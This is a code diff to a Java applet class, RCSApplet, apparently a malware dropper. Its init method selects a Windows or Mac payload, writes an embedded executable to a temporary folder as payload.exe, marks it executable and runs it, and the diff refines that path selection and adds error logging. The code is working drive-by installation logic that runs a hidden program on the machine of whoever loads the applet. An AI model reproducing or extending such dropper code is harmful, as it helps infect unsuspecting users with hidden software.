@@ -10,10 +10,7 @@ public class RCSApplet extends Applet {
 	
 	public void init() {
 		Process f;
-		String payloadPrefix = getParameter("first");
 		InputStream payloadStream = null;
-		
-		System.out.println("Dropping " + payloadPrefix);
 		
 		Properties props = new Properties();
 		Class clazz = RCSApplet.class;
@@ -23,12 +20,13 @@ public class RCSApplet extends Applet {
 		
 		try {
 			// get payload path
-			String payloadPath = "/" + payloadPrefix;
+			String payloadPath = "/";
 			if (isWindows()) {
 				System.out.println("Running on Windows");
-				payloadPath += ".exe";
+				payloadPath += "win";
 			} else if (isMac()) {
 				System.out.println("Running on Mac");
+				payloadPath += "mac";
 			} else {
 				System.out.println("Running on an unknown operating system, exiting!");
 				System.exit(0);
@@ -46,24 +44,26 @@ public class RCSApplet extends Applet {
 			File executableFile = new File(tempDir, "payload.exe");
 			writeEmbeddedFile(payloadStream, executableFile);
 			
+			executableFile.setExecutable(true);
+			
 			// execute payload
 			System.out.println("Running " + executableFile.getCanonicalPath());
 			f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()});
 			f.waitFor();
 			
 		} catch (IOException ioe) {
-			
+			System.out.println("ERROR " + ioe.getMessage());
 		} catch (NullPointerException npe) {
-			
+			System.out.println("ERROR " + npe.getMessage());
 		} catch (InterruptedException ie) {
-			
+			System.out.println("ERROR " + ie.getMessage());
 		} finally {
 			try {
 				payloadStream.close();
 			} catch (IOException ioe) {
-				
+				System.out.println("ERROR " + ioe.getMessage());
 			} catch (NullPointerException npe) {
-				
+				System.out.println("ERROR " + npe.getMessage());
 			}
 		}
 	}
